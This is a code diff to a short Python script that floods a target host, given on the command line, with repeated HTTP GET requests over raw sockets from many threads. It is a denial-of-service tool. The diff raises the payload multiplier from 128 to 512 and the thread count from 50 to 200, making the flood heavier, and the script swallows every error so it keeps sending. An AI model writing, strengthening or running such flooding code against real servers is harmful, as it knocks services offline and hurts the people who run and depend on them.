@@ -6,10 +6,10 @@ def get():
              host = str(sys.argv[1])
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.connect((host, 80))
-             s.send(f'GET / HTTP/1.1\r\nHost:{host}\r\n\r\n'.encode() * 128)
+             s.send(f'GET / HTTP/1.1\r\nHost:{host}\r\n\r\n'.encode() * 512)
          except KeyboardInterrupt:
              sys.exit(-1)
          except:
              pass
-for i in range(0, 50):
+for i in range(0, 200):
     threading.Thread(target=get).start()
